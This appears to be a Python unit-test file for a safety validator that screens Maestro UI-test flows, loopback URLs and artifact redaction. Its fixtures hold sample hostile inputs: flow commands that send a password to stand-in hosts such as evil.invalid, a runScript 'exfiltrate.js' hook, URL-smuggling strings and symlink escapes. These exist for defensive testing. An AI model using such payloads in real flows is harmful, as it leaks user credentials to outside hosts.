from __future__ import annotations

import io
import os
import sys
import tempfile
from pathlib import Path
import unittest
from unittest import mock


SCRIPTS_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS_DIR))

import check_test_automation as automation  # noqa: E402
import maestro_safety  # noqa: E402
import redact_maestro  # noqa: E402


class LoopbackURLTests(unittest.TestCase):
    def test_accepts_explicit_loopback_http_origins(self) -> None:
        for value in ("http://127.0.0.1:18585", "http://localhost:1"):
            with self.subTest(value=value):
                maestro_safety.validate_loopback_http_url(value)

    def test_rejects_ambiguous_or_non_loopback_urls(self) -> None:
        values = (
            "https://127.0.0.1:18585",
            "http://example.invalid:18585",
            "http://127.0.0.1:18585@evil.example",
            "http://localhost:18585.evil.example",
            "http://127.0.0.1",
            "http://127.0.0.1:",
            "http://127.0.0.1:0",
            "http://127.0.0.1:65536",
            "http://127.0.0.1:not-a-port",
            "http://127.0.0.1:18585/",
            "http://127.0.0.1:18585?next=//evil.example",
            "http://127.0.0.1:18585?",
            "http://127.0.0.1:18585#fragment",
            "http://127.0.0.1:18585#",
            "http://127.0.0.1:18585?#",
            "http://127.0.0.1:18585\nhttps://evil.example",
        )
        for value in values:
            with self.subTest(value=value):
                with self.assertRaises(maestro_safety.SafetyError):
                    maestro_safety.validate_loopback_http_url(value)

    def test_requires_exact_local_only_maestro_config(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            config = Path(raw) / "config.yaml"
            config.write_text(maestro_safety.EXPECTED_MAESTRO_CONFIG)
            maestro_safety.validate_maestro_config(config)

            config.write_text(
                maestro_safety.EXPECTED_MAESTRO_CONFIG
                + "onFlowStart:\n  - runScript: exfiltrate.js\n"
            )
            with self.assertRaises(maestro_safety.SafetyError):
                maestro_safety.validate_maestro_config(config)


class FlowSafetyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        self.flow = self.root / "e2e" / "maestro" / "flows" / "test.yaml"
        self.helpers = self.root / "e2e" / "maestro" / "helpers"
        self.flow.parent.mkdir(parents=True)
        self.helpers.mkdir(parents=True)
        self.root_patch = mock.patch.object(automation, "ROOT", self.root)
        self.helpers_patch = mock.patch.object(automation, "HELPERS_DIR", self.helpers)
        self.root_patch.start()
        self.helpers_patch.start()

    def tearDown(self) -> None:
        self.helpers_patch.stop()
        self.root_patch.stop()
        self.temporary.cleanup()

    def write_flow(self, body: str) -> None:
        self.flow.write_text(
            "url: ${MAESTRO_SERVER_URL}\n"
            "name: Safety fixture\n"
            "tags:\n"
            "  - lab\n"
            "---\n"
            "- inputText: ${MAESTRO_USERNAME}\n"
            "- inputText: ${MAESTRO_PASSWORD}\n"
            f"{body}"
        )

    def assert_rejected(self, body: str) -> None:
        self.write_flow(body)
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_accepts_inline_conditional_subflow(self) -> None:
        self.write_flow(
            "- launchApp\n"
            "- runFlow:\n"
            "    when:\n"
            "      visible: Safe label\n"
            "    commands:\n"
            "      - tapOn: Safe label\n"
        )
        automation.validate_flow(self.flow)

    def test_accepts_and_validates_repository_helper(self) -> None:
        helper = self.helpers / "scroll.yaml"
        helper.write_text(
            "- repeat:\n"
            "    times: 2\n"
            "    commands:\n"
            "      - runFlow:\n"
            "          when:\n"
            "            notVisible:\n"
            "              id: ${TARGET_ID}\n"
            "          commands:\n"
            "            - swipe:\n"
            "                start: 10%,70%\n"
            "                end: 10%,60%\n"
        )
        self.write_flow("- runFlow: ../helpers/scroll.yaml\n")
        automation.validate_flow(self.flow)

    def test_rejects_exfiltration_capable_commands(self) -> None:
        bodies = (
            "- openLink: //example.invalid/${MAESTRO_PASSWORD}\n",
            "- runScript: scripts/exfiltrate.js\n",
            "- addMedia: /tmp/private-file\n",
            "- assertWithAI: Read this screen\n",
            "- assertNoDefectsWithAI\n",
            "- extractTextWithAI: Read this screen\n",
            "- launchApp:\n    appId: https:${MAESTRO_PASSWORD}//example.invalid\n",
            '- "openLink": //example.invalid/${MAESTRO_PASSWORD}\n',
            '- {openLink: "//example.invalid/${MAESTRO_PASSWORD}"}\n',
            '- {runScript: scripts/exfiltrate.js}\n',
            '- "runScript": scripts/exfiltrate.js\n',
            "-\n  runScript: scripts/exfiltrate.js\n",
            '- "launchApp":\n    appId: other-target\n',
            "- evalScript: ${MAESTRO_PASSWORD}\n",
            "- copyTextFrom: Password\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_external_file_subflows(self) -> None:
        outside = self.root / "outside.yaml"
        outside.write_text("- tapOn: Unsafe\n")
        bodies = (
            "- runFlow: ../../../outside.yaml\n",
            "- runFlow:\n    file: ../../../outside.yaml\n",
            '- runFlow:\n    "file": ../../../outside.yaml\n',
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_password_interpolation_outside_input_text(self) -> None:
        bodies = (
            "- tapOn:\n    id: ${MAESTRO_PASSWORD}\n",
            "- assertVisible: ${MAESTRO_PASSWORD}\n",
            "- inputText: prefix-${MAESTRO_PASSWORD}\n",
            "- runFlow:\n    env:\n      TARGET_ID: ${MAESTRO_PASSWORD}\n    commands:\n      - tapOn: Safe\n",
            "- assertVisible: ${http.post('ht' + 'tps://evil.invalid', MAESTRO_PASSWORD)}\n",
            "- assertVisible: ${HOME}\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_password_interpolation_in_header(self) -> None:
        self.flow.write_text(
            "url: ${MAESTRO_SERVER_URL}\n"
            "name: Safety fixture\n"
            "tags:\n"
            "  - lab\n"
            "env:\n"
            "  LEAK: ${MAESTRO_PASSWORD}\n"
            "---\n"
            "- inputText: ${MAESTRO_USERNAME}\n"
        )
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_rejects_header_target_overrides(self) -> None:
        headers = (
            "url: https://evil.invalid",
            "appId: https://evil.invalid",
        )
        for override in headers:
            with self.subTest(override=override):
                self.flow.write_text(
                    "url: ${MAESTRO_SERVER_URL}\n"
                    "name: Safety fixture\n"
                    "tags:\n"
                    "  - lab\n"
                    f"{override}\n"
                    "---\n"
                    "- inputText: ${MAESTRO_USERNAME}\n"
                    "- inputText: ${MAESTRO_PASSWORD}\n"
                )
                with self.assertRaises(automation.ValidationError):
                    automation.validate_flow(self.flow)

    def test_rejects_symlinked_flow(self) -> None:
        target = self.root / "outside-flow.yaml"
        self.write_flow("- launchApp\n")
        self.flow.replace(target)
        self.flow.symlink_to(target)
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_rejects_screenshot_capture(self) -> None:
        self.write_flow("- launchApp\n- takeScreenshot: evidence-auth-signed-in\n")
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)


class RedactionTests(unittest.TestCase):
    def test_sanitizes_text_and_binary_artifacts(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            text_artifact = root / "commands.json"
            binary_artifact = root / "screenshot.bin"
            text_artifact.write_text(f'{{"password":"{secret}"}}')
            binary_artifact.write_bytes(b"prefix\x00" + secret.encode() + b"\xffsuffix")

            self.assertEqual(redact_maestro.sanitize_tree(root, [secret]), 0)

            self.assertNotIn(secret.encode(), text_artifact.read_bytes())
            self.assertNotIn(secret.encode(), binary_artifact.read_bytes())
            self.assertIn(redact_maestro.REDACTION.encode(), text_artifact.read_bytes())
            self.assertIn(redact_maestro.REDACTION.encode(), binary_artifact.read_bytes())

    def test_stream_redacts_repeated_and_non_newline_occurrences(self) -> None:
        source = io.StringIO("secret once secret\nfinal-secret")
        destination = io.StringIO()
        with mock.patch.object(sys, "stdin", source), mock.patch.object(sys, "stdout", destination):
            self.assertEqual(redact_maestro.stream(["secret"]), 0)
        self.assertEqual(
            destination.getvalue(),
            f"{redact_maestro.REDACTION} once {redact_maestro.REDACTION}\n"
            f"final-{redact_maestro.REDACTION}",
        )

    def test_cli_requires_a_nonempty_password(self) -> None:
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            sys, "argv", ["redact_maestro.py", "stream"]
        ), mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(redact_maestro.main(), 2)

    def test_rejects_artifact_symlink_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw) / "artifacts"
            root.mkdir()
            target = Path(raw) / "outside.txt"
            target.write_text(secret)
            (root / "linked.txt").symlink_to(target)

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)

    def test_rejects_secret_bearing_artifact_filename(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / f"failure-{secret}.txt").write_text("safe contents")
            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])

    def test_rejects_secret_bearing_directory_name(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / f"failure-{secret}").mkdir()
            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])

    def test_rejects_symlinked_artifact_root_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            outside = Path(raw) / "outside"
            outside.mkdir()
            target = outside / "victim.txt"
            target.write_text(secret)
            root = Path(raw) / "artifacts"
            root.symlink_to(outside, target_is_directory=True)

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)

    def test_rejects_hardlinked_artifact_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw) / "artifacts"
            root.mkdir()
            target = Path(raw) / "outside.txt"
            target.write_text(secret)
            os.link(target, root / "linked.txt")

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)


if __name__ == "__main__":
    unittest.main()
